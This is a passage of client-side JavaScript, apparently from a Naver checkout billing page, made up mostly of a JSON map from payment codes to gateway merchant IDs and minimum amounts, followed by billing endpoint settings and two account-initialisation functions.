:"naver_PG44","minamt":"300000"},"51080C002":{"submid":"naver_shoppay32","pgid":"51081","mid":"naver_shoppay32","minamt":"100000"},"51253C002":{"submid":"naver_booking08","pgid":"51254","mid":"naver_booking08","minamt":"100000"},"51296C002":{"submid":"naver_PG61","pgid":"51298","mid":"naver_PG61","minamt":"100000"},"51296C003":{"submid":"naver_PG61","pgid":"51298","mid":"naver_PG61","minamt":"100000"},"51247C010":{"submid":"naver_PG19","pgid":"51248","mid":"naver_PG19","minamt":"300000"},"51074C010":{"submid":"naver_shoppay39","pgid":"51075","mid":"naver_shoppay39","minamt":"300000"},"51080C006":{"submid":"naver_shoppay32","pgid":"51081","mid":"naver_shoppay32","minamt":"200000"},"51253C006":{"submid":"naver_booking08","pgid":"51254","mid":"naver_booking08","minamt":"200000"},"51296C006":{"submid":"naver_PG61","pgid":"51298","mid":"naver_PG61","minamt":"200000"},"51067C003":{"submid":"naver_shoppay99","pgid":"51068","mid":"naver_shoppay99","minamt":"100000"},"51078CH06":{"submid":"naver_shoppay30","pgid":"51079","mid":"naver_shoppay30","minamt":"100000"},"51080C003":{"submid":"naver_shoppay32","pgid":"51081","mid":"naver_shoppay32","minamt":"100000"},"51253C003":{"submid":"naver_booking08","pgid":"51254","mid":"naver_booking08","minamt":"100000"},"51067C002":{"submid":"naver_shoppay99","pgid":"51068","mid":"naver_shoppay99","minamt":"100000"},"51221CH06":{"submid":"naver_shoppay69","pgid":"51222","mid":"naver_shoppay69","minamt":"100000"},"01051C006":{"submid":"naver_local02","pgid":"01052","mid":"naver_local02","minamt":"200000"},"01045C010":{"submid":"naver_booking02","pgid":"01046","mid":"naver_booking02","minamt":"300000"},"51279CH10":{"submid":"naver_smartstore08","pgid":"51280","mid":"naver_smartstore08","minamt":"300000"},"01051C002":{"submid":"naver_local02","pgid":"01052","mid":"naver_local02","minamt":"100000"},"01051C003":{"submid":"naver_local02","pgid":"01052","mid":"naver_local02","minamt":"100000"},"51304C006":{"submid":"naver_PG48","pgid":"51310","mid":"naver_PG48","minamt":"200000"},"51270CH10":{"submid":"naver_PG38","pgid":"51276","mid":"naver_PG38","minamt":"300000"},"51285CH06":{"submid":"naver_order18","pgid":"51286","mid":"naver_order18","minamt":"100000"},"51304C002":{"submid":"naver_PG48","pgid":"51310","mid":"naver_PG48","minamt":"100000"},"51304C003":{"submid":"naver_PG48","pgid":"51310","mid":"naver_PG48","minamt":"100000"},"51225C002":{"submid":"naver_PG06","pgid":"51226","mid":"naver_PG06","minamt":"100000"},"51225C003":{"submid":"naver_PG06","pgid":"51226","mid":"naver_PG06","minamt":"100000"},"51268C002":{"submid":"naver_PG34","pgid":"51274","mid":"naver_PG34","minamt":"100000"},"51225C006":{"submid":"naver_PG06","pgid":"51226","mid":"naver_PG06","minamt":"200000"},"51219C010":{"submid":"naver_shoppay67","pgid":"51220","mid":"naver_shoppay67","minamt":"300000"},"51221CH10":{"submid":"naver_shoppay69","pgid":"51222","mid":"naver_shoppay69","minamt":"300000"},"51080C010":{"submid":"naver_shoppay32","pgid":"51081","mid":"naver_shoppay32","minamt":"300000"},"51253C010":{"submid":"naver_booking08","pgid":"51254","mid":"naver_booking08","minamt":"300000"},"51279CH06":{"submid":"naver_smartstore08","pgid":"51280","mid":"naver_smartstore08","minamt":"100000"},"51108CH06":{"submid":"naver_shoppay61","pgid":"51111","mid":"naver_shoppay61","minamt":"100000"},"01045C006":{"submid":"naver_booking02","pgid":"01046","mid":"naver_booking02","minamt":"200000"},"51268C006":{"submid":"naver_PG34","pgid":"51274","mid":"naver_PG34","minamt":"200000"},"51268C003":{"submid":"naver_PG34","pgid":"51274","mid":"naver_PG34","minamt":"100000"},"01045C003":{"submid":"naver_booking02","pgid":"01046","mid":"naver_booking02","minamt":"100000"},"51304CH06":{"submid":"naver_PG48","pgid":"51310","mid":"naver_PG48","minamt":"100000"},"51290C006":{"submid":"naver_local_kicc04","pgid":"51291","mid":"naver_local_kicc04","minamt":"200000"},"51294CH10":{"submid":"naver_shoppay84","pgid":"51295","mid":"naver_shoppay84","minamt":"300000"},"51266C006":{"submid":"naver_PG30","pgid":"51272","mid":"naver_PG30","minamt":"200000"},"51053CH06":{"submid":"naver_shoppay07","pgid":"51054","mid":"naver_shoppay07","minamt":"100000"},"51304CH10":{"submid":"naver_PG48","pgid":"51310","mid":"naver_PG48","minamt":"300000"},"51290C010":{"submid":"naver_local_kicc04","pgid":"51291","mid":"naver_local_kicc04","minamt":"300000"},"51266C002":{"submid":"naver_PG30","pgid":"51272","mid":"naver_PG30","minamt":"100000"},"51266C003":{"submid":"naver_PG30","pgid":"51272","mid":"naver_PG30","minamt":"100000"},"51294CH06":{"submid":"naver_shoppay84","pgid":"51295","mid":"naver_shoppay84","minamt":"100000"},"51251C010":{"submid":"naver_booking04","pgid":"51252","mid":"naver_booking04","minamt":"300000"},"51300C006":{"submid":"naver_PG44","pgid":"51301","mid":"naver_PG44","minamt":"200000"},"51073C010":{"submid":"naver_shoppay43","pgid":"51096","mid":"naver_shoppay43","minamt":"300000"},"51243C010":{"submid":"naver_PG17","pgid":"51244","mid":"naver_PG17","minamt":"300000"},"01049CH06":{"submid":"naver_local_kis02","pgid":"01050","mid":"naver_local_kis02","minamt":"100000"},"51300C002":{"submid":"naver_PG44","pgid":"51301","mid":"naver_PG44","minamt":"100000"},"51300C003":{"submid":"naver_PG44","pgid":"51301","mid":"naver_PG44","minamt":"100000"},"01065CH06":{"submid":"naver_order22","pgid":"01066","mid":"naver_order22","minamt":"100000"},"51053CH10":{"submid":"naver_shoppay07","pgid":"51054","mid":"naver_shoppay07","minamt":"300000"},"51073C003":{"submid":"naver_shoppay43","pgid":"51096","mid":"naver_shoppay43","minamt":"100000"},"51073C006":{"submid":"naver_shoppay43","pgid":"51096","mid":"naver_shoppay43","minamt":"200000"},"51251C006":{"submid":"naver_booking04","pgid":"51252","mid":"naver_booking04","minamt":"200000"},"51251C003":{"submid":"naver_booking04","pgid":"51252","mid":"naver_booking04","minamt":"100000"},"51251C002":{"submid":"naver_booking04","pgid":"51252","mid":"naver_booking04","minamt":"100000"},"51307C006":{"submid":"naver_PG54","pgid":"51313","mid":"naver_PG54","minamt":"200000"},"01049CH10":{"submid":"naver_local_kis02","pgid":"01050","mid":"naver_local_kis02","minamt":"300000"},"51243C002":{"submid":"naver_PG17","pgid":"51244","mid":"naver_PG17","minamt":"100000"},"51243C003":{"submid":"naver_PG17","pgid":"51244","mid":"naver_PG17","minamt":"100000"},"51069CH10":{"submid":"naver_shoppay37","pgid":"51070","mid":"naver_shoppay37","minamt":"300000"},"51235C003":{"submid":"naver_PG09","pgid":"51236","mid":"naver_PG09","minamt":"100000"},"01057CH10":{"submid":"naver_smartstore02","pgid":"01058","mid":"naver_smartstore02","minamt":"300000"},"51297C010":{"submid":"naver_PG62","pgid":"51299","mid":"naver_PG62","minamt":"300000"},"51235C006":{"submid":"naver_PG09","pgid":"51236","mid":"naver_PG09","minamt":"200000"},"51263CH10":{"submid":"naver_order12","pgid":"51264","mid":"naver_order12","minamt":"300000"},"01029C006":{"submid":"naver_shoppay26","pgid":"01030","mid":"naver_shoppay26","minamt":"200000"},"01029C003":{"submid":"naver_shoppay26","pgid":"01030","mid":"naver_shoppay26","minamt":"100000"},"01061C002":{"submid":"naver_booking10","pgid":"01062","mid":"naver_booking10","minamt":"100000"},"51235C002":{"submid":"naver_PG09","pgid":"51236","mid":"naver_PG09","minamt":"100000"},"01061C003":{"submid":"naver_booking10","pgid":"01062","mid":"naver_booking10","minamt":"100000"},"01029C002":{"submid":"naver_shoppay26","pgid":"01030","mid":"naver_shoppay26","minamt":"100000"},"01061C006":{"submid":"naver_booking10","pgid":"01062","mid":"naver_booking10","minamt":"200000"},"51243C006":{"submid":"naver_PG17","pgid":"51244","mid":"naver_PG17","minamt":"200000"},"51072C003":{"submid":"naver_shoppay42","pgid":"51095","mid":"naver_shoppay42","minamt":"100000"},"51072C002":{"submid":"naver_shoppay42","pgid":"51095","mid":"naver_shoppay42","minamt":"100000"},"51316C006":{"submid":"naver_PG60","pgid":"51317","mid":"naver_PG60","minamt":"200000"},"51069CH06":{"submid":"naver_shoppay37","pgid":"51070","mid":"naver_shoppay37","minamt":"100000"},"51316C003":{"submid":"naver_PG60","pgid":"51317","mid":"naver_PG60","minamt":"100000"},"51307C002":{"submid":"naver_PG54","pgid":"51313","mid":"naver_PG54","minamt":"100000"},"51316C002":{"submid":"naver_PG60","pgid":"51317","mid":"naver_PG60","minamt":"100000"},"51307C003":{"submid":"naver_PG54","pgid":"51313","mid":"naver_PG54","minamt":"100000"},"51297C006":{"submid":"naver_PG62","pgid":"51299","mid":"naver_PG62","minamt":"200000"},"51297C003":{"submid":"naver_PG62","pgid":"51299","mid":"naver_PG62","minamt":"100000"},"51297C002":{"submid":"naver_PG62","pgid":"51299","mid":"naver_PG62","minamt":"100000"},"01061C010":{"submid":"naver_booking10","pgid":"01062","mid":"naver_booking10","minamt":"300000"},"51235C010":{"submid":"naver_PG09","pgid":"51236","mid":"naver_PG09","minamt":"300000"},"51107C010":{"submid":"naver_shoppay42","pgid":"51095","mid":"naver_shoppay42","minamt":"300000"},"01057CH06":{"submid":"naver_smartstore02","pgid":"01058","mid":"naver_smartstore02","minamt":"100000"},"51290C003":{"submid":"naver_local_kicc04","pgid":"51291","mid":"naver_local_kicc04","minamt":"100000"},"51316C010":{"submid":"naver_PG60","pgid":"51317","mid":"naver_PG60","minamt":"300000"},"51290C002":{"submid":"naver_local_kicc04","pgid":"51291","mid":"naver_local_kicc04","minamt":"100000"},"51265C006":{"submid":"naver_PG28","pgid":"51271","mid":"naver_PG28","minamt":"200000"},"51283C010":{"submid":"naver_booking16","pgid":"51284","mid":"naver_booking16","minamt":"300000"},"51277CH10":{"submid":"naver_smartstore06","pgid":"51278","mid":"naver_smartstore06","minamt":"300000"},"51259C010":{"submid":"naver_PG26","pgid":"51260","mid":"naver_PG26","minamt":"300000"},"51267C010":{"submid":"naver_PG32","pgid":"51273","mid":"naver_PG32","minamt":"300000"},"51265C003":{"submid":"naver_PG28","pgid":"51271","mid":"naver_PG28","minamt":"100000"},"51265C002":{"submid":"naver_PG28","pgid":"51271","mid":"naver_PG28","minamt":"100000"},"51249C002":{"submid":"naver_PG21","pgid":"51250","mid":"naver_PG21","minamt":"100000"},"51249C003":{"submid":"naver_PG21","pgid":"51250","mid":"naver_PG21","minamt":"100000"},"01043CH10":{"submid":"naver_PG02","pgid":"01044","mid":"naver_PG02","minamt":"300000"},"51249C006":{"submid":"naver_PG21","pgid":"51250","mid":"naver_PG21","minamt":"200000"},"51283C003":{"submid":"naver_booking16","pgid":"51284","mid":"naver_booking16","minamt":"100000"},"51283C002":{"submid":"naver_booking16","pgid":"51284","mid":"naver_booking16","minamt":"100000"},"51277CH06":{"submid":"naver_smartstore06","pgid":"51278","mid":"naver_smartstore06","minamt":"100000"},"51283C006":{"submid":"naver_booking16","pgid":"51284","mid":"naver_booking16","minamt":"200000"},"51060CH06":{"submid":"naver_shoppay14","pgid":"51061","mid":"naver_shoppay14","minamt":"100000"},"51239CH06":{"submid":"naver_PG13","pgid":"51240","mid":"naver_PG13","minamt":"100000"},"01053C010":{"submid":"naver_order14","pgid":"01054","mid":"naver_order14","minamt":"300000"},"51259C006":{"submid":"naver_PG26","pgid":"51260","mid":"naver_PG26","minamt":"200000"},"51259C003":{"submid":"naver_PG26","pgid":"51260","mid":"naver_PG26","minamt":"100000"},"51259C002":{"submid":"naver_PG26","pgid":"51260","mid":"naver_PG26","minamt":"100000"},"51287CH10":{"submid":"naver_order20","pgid":"51288","mid":"naver_order20","minamt":"300000"},"51072C006":{"submid":"naver_shoppay42","pgid":"51095","mid":"naver_shoppay42","minamt":"200000"},"51287CH06":{"submid":"naver_order20","pgid":"51288","mid":"naver_order20","minamt":"100000"},"51072C010":{"submid":"naver_shoppay42","pgid":"51095","mid":"naver_shoppay42","minamt":"300000"},"01053C006":{"submid":"naver_order14","pgid":"01054","mid":"naver_order14","minamt":"200000"},"51307C010":{"submid":"naver_PG54","pgid":"51313","mid":"naver_PG54","minamt":"300000"},"51245CH06":{"submid":"naver_PG23","pgid":"51246","mid":"naver_PG23","minamt":"100000"},"51082C003":{"submid":"naver_shoppay44","pgid":"51097","mid":"naver_shoppay44","minamt":"100000"},"51082C002":{"submid":"naver_shoppay44","pgid":"51097","mid":"naver_shoppay44","minamt":"100000"},"01053C002":{"submid":"naver_order14","pgid":"01054","mid":"naver_order14","minamt":"100000"},"01047C010":{"submid":"naver_booking06","pgid":"01048","mid":"naver_booking06","minamt":"300000"},"01053C003":{"submid":"naver_order14","pgid":"01054","mid":"naver_order14","minamt":"100000"},"51239CH10":{"submid":"naver_PG13","pgid":"51240","mid":"naver_PG13","minamt":"300000"},"51255CH10":{"submid":"naver_local_kis04","pgid":"51256","mid":"naver_local_kis04","minamt":"300000"},"51306C003":{"submid":"naver_PG52","pgid":"51312","mid":"naver_PG52","minamt":"100000"},"51306C002":{"submid":"naver_PG52","pgid":"51312","mid":"naver_PG52","minamt":"100000"},"51261CH06":{"submid":"naver_order10","pgid":"51262","mid":"naver_order10","minamt":"100000"},"51306C006":{"submid":"naver_PG52","pgid":"51312","mid":"naver_PG52","minamt":"200000"},"51076CH10":{"submid":"naver_shoppay28","pgid":"51077","mid":"naver_shoppay28","minamt":"300000"},"51255CH06":{"submid":"naver_local_kis04","pgid":"51256","mid":"naver_local_kis04","minamt":"100000"},"51245CH10":{"submid":"naver_PG23","pgid":"51246","mid":"naver_PG23","minamt":"300000"},"01047C003":{"submid":"naver_booking06","pgid":"01048","mid":"naver_booking06","minamt":"100000"},"01047C002":{"submid":"naver_booking06","pgid":"01048","mid":"naver_booking06","minamt":"100000"},"01065CH10":{"submid":"naver_order22","pgid":"01066","mid":"naver_order22","minamt":"300000"},"01047C006":{"submid":"naver_booking06","pgid":"01048","mid":"naver_booking06","minamt":"200000"},"51065C010":{"submid":"naver_shoppay28","pgid":"51066","mid":"naver_shoppay28","minamt":"300000"},"01069C002":{"submid":"naver_local_kicc02","pgid":"01070","mid":"naver_local_kicc02","minamt":"100000"},"01069C003":{"submid":"naver_local_kicc02","pgid":"01070","mid":"naver_local_kicc02","minamt":"100000"},"01069C006":{"submid":"naver_local_kicc02","pgid":"01070","mid":"naver_local_kicc02","minamt":"200000"},"51082C010":{"submid":"naver_shoppay44","pgid":"51097","mid":"naver_shoppay44","minamt":"300000"},"51071C003":{"submid":"naver_shoppay41","pgid":"51094","mid":"naver_shoppay41","minamt":"100000"},"51071C002":{"submid":"naver_shoppay41","pgid":"51094","mid":"naver_shoppay41","minamt":"100000"},"51223CH10":{"submid":"naver_PG04","pgid":"51224","mid":"naver_PG04","minamt":"300000"},"51302C010":{"submid":"naver_PG42","pgid":"51308","mid":"naver_PG42","minamt":"300000"},"51065C006":{"submid":"naver_shoppay28","pgid":"51066","mid":"naver_shoppay28","minamt":"200000"},"01043CH06":{"submid":"naver_PG02","pgid":"01044","mid":"naver_PG02","minamt":"100000"},"51266C010":{"submid":"naver_PG30","pgid":"51272","mid":"naver_PG30","minamt":"300000"},"51065C003":{"submid":"naver_shoppay28","pgid":"51066","mid":"naver_shoppay28","minamt":"100000"},"51076CH06":{"submid":"naver_shoppay28","pgid":"51077","mid":"naver_shoppay28","minamt":"100000"},"51065C002":{"submid":"naver_shoppay28","pgid":"51066","mid":"naver_shoppay28","minamt":"100000"},"51249C010":{"submid":"naver_PG21","pgid":"51250","mid":"naver_PG21","minamt":"300000"},"51223CH06":{"submid":"naver_PG04","pgid":"51224","mid":"naver_PG04","minamt":"100000"},"01069C010":{"submid":"naver_local_kicc02","pgid":"01070","mid":"naver_local_kicc02","minamt":"300000"},"51082C006":{"submid":"naver_shoppay44","pgid":"51097","mid":"naver_shoppay44","minamt":"200000"},"51071C010":{"submid":"naver_shoppay41","pgid":"51094","mid":"naver_shoppay41","minamt":"300000"},"51306CH10":{"submid":"naver_PG52","pgid":"51312","mid":"naver_PG52","minamt":"300000"},"51108C006":{"submid":"naver_shoppay61","pgid":"51111","mid":"naver_shoppay61","minamt":"200000"},"51221C002":{"submid":"naver_shoppay69","pgid":"51222","mid":"naver_shoppay69","minamt":"100000"},"51225CH10":{"submid":"naver_PG06","pgid":"51226","mid":"naver_PG06","minamt":"300000"},"51221C003":{"submid":"naver_shoppay69","pgid":"51222","mid":"naver_shoppay69","minamt":"100000"},"51221C006":{"submid":"naver_shoppay69","pgid":"51222","mid":"naver_shoppay69","minamt":"200000"},"51268CH10":{"submid":"naver_PG34","pgid":"51274","mid":"naver_PG34","minamt":"300000"},"01059CH06":{"submid":"naver_smartstore04","pgid":"01060","mid":"naver_smartstore04","minamt":"100000"},"51268CH06":{"submid":"naver_PG34","pgid":"51274","mid":"naver_PG34","minamt":"100000"},"51071C006":{"submid":"naver_shoppay41","pgid":"51094","mid":"naver_shoppay41","minamt":"200000"},"51225CH06":{"submid":"naver_PG06","pgid":"51226","mid":"naver_PG06","minamt":"100000"},"01067CH06":{"submid":"naver_order24","pgid":"01068","mid":"naver_order24","minamt":"100000"},"51108C002":{"submid":"naver_shoppay61","pgid":"51111","mid":"naver_shoppay61","minamt":"100000"},"51108C003":{"submid":"naver_shoppay61","pgid":"51111","mid":"naver_shoppay61","minamt":"100000"},"51292C006":{"submid":"naver_shoppay82","pgid":"51293","mid":"naver_shoppay82","minamt":"200000"},"51067CH10":{"submid":"naver_shoppay99","pgid":"51068","mid":"naver_shoppay99","minamt":"300000"},"51261CH10":{"submid":"naver_order10","pgid":"51262","mid":"naver_order10","minamt":"300000"},"51098C002":{"submid":"naver_shoppay46","pgid":"51099","mid":"naver_shoppay46","minamt":"100000"},"01055C002":{"submid":"naver_order16","pgid":"01056","mid":"naver_order16","minamt":"100000"},"51306CH06":{"submid":"naver_PG52","pgid":"51312","mid":"naver_PG52","minamt":"100000"},"51098C003":{"submid":"naver_shoppay46","pgid":"51099","mid":"naver_shoppay46","minamt":"100000"},"01055C003":{"submid":"naver_order16","pgid":"01056","mid":"naver_order16","minamt":"100000"},"51098C006":{"submid":"naver_shoppay46","pgid":"51099","mid":"naver_shoppay46","minamt":"200000"},"51098C010":{"submid":"naver_shoppay46","pgid":"51099","mid":"naver_shoppay46","minamt":"300000"},"01059CH10":{"submid":"naver_smartstore04","pgid":"01060","mid":"naver_smartstore04","minamt":"300000"},"51292C010":{"submid":"naver_shoppay82","pgid":"51293","mid":"naver_shoppay82","minamt":"300000"},"51067CH06":{"submid":"naver_shoppay99","pgid":"51068","mid":"naver_shoppay99","minamt":"100000"},"51060CH10":{"submid":"naver_shoppay14","pgid":"51061","mid":"naver_shoppay14","minamt":"300000"},"51237C010":{"submid":"naver_PG11","pgid":"51238","mid":"naver_PG11","minamt":"300000"},"01055C010":{"submid":"naver_order16","pgid":"01056","mid":"naver_order16","minamt":"300000"},"01063C010":{"submid":"naver_booking14","pgid":"01064","mid":"naver_booking14","minamt":"300000"},"01055C006":{"submid":"naver_order16","pgid":"01056","mid":"naver_order16","minamt":"200000"},"51292C002":{"submid":"naver_shoppay82","pgid":"51293","mid":"naver_shoppay82","minamt":"100000"},"51292C003":{"submid":"naver_shoppay82","pgid":"51293","mid":"naver_shoppay82","minamt":"100000"},"51237C002":{"submid":"naver_PG11","pgid":"51238","mid":"naver_PG11","minamt":"100000"},"51237C003":{"submid":"naver_PG11","pgid":"51238","mid":"naver_PG11","minamt":"100000"},"51237C006":{"submid":"naver_PG11","pgid":"51238","mid":"naver_PG11","minamt":"200000"},"51100C002":{"submid":"naver_shoppay48","pgid":"51101","mid":"naver_shoppay48","minamt":"100000"},"51303CH10":{"submid":"naver_PG46","pgid":"51309","mid":"naver_PG46","minamt":"300000"},"51100C003":{"submid":"naver_shoppay48","pgid":"51101","mid":"naver_shoppay48","minamt":"100000"},"51100C006":{"submid":"naver_shoppay48","pgid":"51101","mid":"naver_shoppay48","minamt":"200000"},"51241C003":{"submid":"naver_PG15","pgid":"51242","mid":"naver_PG15","minamt":"100000"},"51265C010":{"submid":"naver_PG28","pgid":"51271","mid":"naver_PG28","minamt":"300000"},"51241C002":{"submid":"naver_PG15","pgid":"51242","mid":"naver_PG15","minamt":"100000"},"51241C006":{"submid":"naver_PG15","pgid":"51242","mid":"naver_PG15","minamt":"200000"},"01063C003":{"submid":"naver_booking14","pgid":"01064","mid":"naver_booking14","minamt":"100000"},"01063C006":{"submid":"naver_booking14","pgid":"01064","mid":"naver_booking14","minamt":"200000"},"51241C010":{"submid":"naver_PG15","pgid":"51242","mid":"naver_PG15","minamt":"300000"},"01063C002":{"submid":"naver_booking14","pgid":"01064","mid":"naver_booking14","minamt":"100000"},"51303CH06":{"submid":"naver_PG46","pgid":"51309","mid":"naver_PG46","minamt":"100000"},"51100C010":{"submid":"naver_shoppay48","pgid":"51101","mid":"naver_shoppay48","minamt":"300000"},"51107C003":{"submid":"naver_shoppay42","pgid":"51095","mid":"naver_shoppay42","minamt":"100000"},"01051CH06":{"submid":"naver_local02","pgid":"01052","mid":"naver_local02","minamt":"100000"},"51109C010":{"submid":"naver_shoppay60","pgid":"51110","mid":"naver_shoppay60","minamt":"300000"},"51107C006":{"submid":"naver_shoppay42","pgid":"51095","mid":"naver_shoppay42","minamt":"200000"},"01045CH10":{"submid":"naver_booking02","pgid":"01046","mid":"naver_booking02","minamt":"300000"},"51107C002":{"submid":"naver_shoppay42","pgid":"51095","mid":"naver_shoppay42","minamt":"100000"},"51305CH06":{"submid":"naver_PG50","pgid":"51311","mid":"naver_PG50","minamt":"100000"},"51080CH10":{"submid":"naver_shoppay32","pgid":"51081","mid":"naver_shoppay32","minamt":"300000"},"51257C002":{"submid":"naver_local04","pgid":"51258","mid":"naver_local04","minamt":"100000"},"51257C006":{"submid":"naver_local04","pgid":"51258","mid":"naver_local04","minamt":"200000"},"51257C003":{"submid":"naver_local04","pgid":"51258","mid":"naver_local04","minamt":"100000"},"51269CH06":{"submid":"naver_PG36","pgid":"51275","mid":"naver_PG36","minamt":"100000"},"01023CH06":{"submid":"naver_shoppay02","pgid":"01024","mid":"naver_shoppay02","minamt":"100000"},"51104CH10":{"submid":"naver_shoppay54","pgid":"51105","mid":"naver_shoppay54","minamt":"300000"},"51281CH06":{"submid":"naver_booking12","pgid":"51282","mid":"naver_booking12","minamt":"100000"},"51263C006":{"submid":"naver_order12","pgid":"51264","mid":"naver_order12","minamt":"200000"},"51263C003":{"submid":"naver_order12","pgid":"51264","mid":"naver_order12","minamt":"100000"},"01029C010":{"submid":"naver_shoppay26","pgid":"01030","mid":"naver_shoppay26","minamt":"300000"},"51263C002":{"submid":"naver_order12","pgid":"51264","mid":"naver_order12","minamt":"100000"},"51263C010":{"submid":"naver_order12","pgid":"51264","mid":"naver_order12","minamt":"300000"},"01051CH10":{"submid":"naver_local02","pgid":"01052","mid":"naver_local02","minamt":"300000"},"51305CH10":{"submid":"naver_PG50","pgid":"51311","mid":"naver_PG50","minamt":"300000"},"51257C010":{"submid":"naver_local04","pgid":"51258","mid":"naver_local04","minamt":"300000"},"51269CH10":{"submid":"naver_PG36","pgid":"51275","mid":"naver_PG36","minamt":"300000"},"51104CH06":{"submid":"naver_shoppay54","pgid":"51105","mid":"naver_shoppay54","minamt":"100000"},"51270C010":{"submid":"naver_PG38","pgid":"51276","mid":"naver_PG38","minamt":"300000"},"51247CH10":{"submid":"naver_PG19","pgid":"51248","mid":"naver_PG19","minamt":"300000"},"51253CH06":{"submid":"naver_booking08","pgid":"51254","mid":"naver_booking08","minamt":"100000"},"51296CH06":{"submid":"naver_PG61","pgid":"51298","mid":"naver_PG61","minamt":"100000"},"51300C010":{"submid":"naver_PG44","pgid":"51301","mid":"naver_PG44","minamt":"300000"},"51281CH10":{"submid":"naver_booking12","pgid":"51282","mid":"naver_booking12","minamt":"300000"},"51279C003":{"submid":"naver_smartstore08","pgid":"51280","mid":"naver_smartstore08","minamt":"100000"},"51279C006":{"submid":"naver_smartstore08","pgid":"51280","mid":"naver_smartstore08","minamt":"200000"},"51270C006":{"submid":"naver_PG38","pgid":"51276","mid":"naver_PG38","minamt":"200000"},"51247CH06":{"submid":"naver_PG19","pgid":"51248","mid":"naver_PG19","minamt":"100000"},"51074CH06":{"submid":"naver_shoppay39","pgid":"51075","mid":"naver_shoppay39","minamt":"100000"},"51279C002":{"submid":"naver_smartstore08","pgid":"51280","mid":"naver_smartstore08","minamt":"100000"},"51078C010":{"submid":"naver_shoppay30","pgid":"51079","mid":"naver_shoppay30","minamt":"300000"},"51221C010":{"submid":"naver_shoppay69","pgid":"51222","mid":"naver_shoppay69","minamt":"300000"},"51253CH10":{"submid":"naver_booking08","pgid":"51254","mid":"naver_booking08","minamt":"300000"},"01045CH06":{"submid":"naver_booking02","pgid":"01046","mid":"naver_booking02","minamt":"100000"},"51285C010":{"submid":"naver_order18","pgid":"51286","mid":"naver_order18","minamt":"300000"},"51296CH10":{"submid":"naver_PG61","pgid":"51298","mid":"naver_PG61","minamt":"300000"},"01067CH10":{"submid":"naver_order24","pgid":"01068","mid":"naver_order24","minamt":"300000"},"51285C006":{"submid":"naver_order18","pgid":"51286","mid":"naver_order18","minamt":"200000"},"51074CH10":{"submid":"naver_shoppay39","pgid":"51075","mid":"naver_shoppay39","minamt":"300000"},"51080CH06":{"submid":"naver_shoppay32","pgid":"51081","mid":"naver_shoppay32","minamt":"100000"},"51219CH06":{"submid":"naver_shoppay67","pgid":"51220","mid":"naver_shoppay67","minamt":"100000"},"51285C003":{"submid":"naver_order18","pgid":"51286","mid":"naver_order18","minamt":"100000"},"51078C006":{"submid":"naver_shoppay30","pgid":"51079","mid":"naver_shoppay30","minamt":"200000"},"51285C002":{"submid":"naver_order18","pgid":"51286","mid":"naver_order18","minamt":"100000"},"51078C002":{"submid":"naver_shoppay30","pgid":"51079","mid":"naver_shoppay30","minamt":"100000"},"51078C003":{"submid":"naver_shoppay30","pgid":"51079","mid":"naver_shoppay30","minamt":"100000"},"51108C010":{"submid":"naver_shoppay61","pgid":"51111","mid":"naver_shoppay61","minamt":"300000"},"51279C010":{"submid":"naver_smartstore08","pgid":"51280","mid":"naver_smartstore08","minamt":"300000"}}',
				_lastCallbackFn : $H({}),
				_returnForm : $H({}),
				_returnCommonForm : $H({}),
				_macRurl : "",
				_asyncCipherUrl : "http://billing.checkout.naver.com/pay/asyncEncrypt.nhn",
				_asyncCipherWithCorsUrl : "http://billing.checkout.naver.com/pay/asyncEncryptWithCors.nhn",
				_device : "PC",
				_oneClickCardInfo : '',
				_oneClickCardPgInfo : '{"C5MOBILE":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"C4MOBILE":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"CFMOBILE":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"CHPC":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"CFPC":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"CHMOBILE":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"C1MOBILE":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"CPMOBILE":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"C7MOBILE":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"C9PC":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"C9MOBILE":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"C7PC":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"C0MOBILE":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"C3MOBILE":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"C5PC":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"C4PC":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"C3PC":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"C1PC":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"C0PC":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"CPPC":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"}}',
				_oneClickBankInfo : '',
				_removeAccountUrl : 'http://billing.checkout.naver.com/pay/removeAccount.nhn', 
				_getAccountInfoUrl : 'http://billing.checkout.naver.com/pay/getAccountInfo.nhn',
				_getOneClickCardInfoUrl : 'http://billing.checkout.naver.com/pay/getOneClickCardInfo.nhn',
				_svctype :  "C2",
				_usePending : "Y"
			};
			
			bill.init = function(pgid) {
				if( !this.variable._bInit ) {
					this.variable._init();
					var _pgFrm = $Form(this.variable._formPG.$(pgid));
				}
					
				if(this.variable._initPG.hasKey(pgid)){
					var initFn = this.variable._initPG.$(pgid);
					return initFn();	
				}
					
				return false;
			};
			
			bill.initAccountInfo = function(callback, ckey){
				bill.commonTransferData(bill.variable._getAccountInfoUrl,$H({rsvseq : '6261708841', chnl : 'NV', userkey : '238621119', 'ckey': ckey, NAMES :"rsvseq, chnl, userkey, ckey"})
						, function(result){
						if( result == 'error'){
							callback(false);
						} else{				
							bill.variable._oneClickBankInfo = $H({resultCode: result.resultCode, bnkCd: result.value});
							callback(true);
						}			
					})		
			}
			
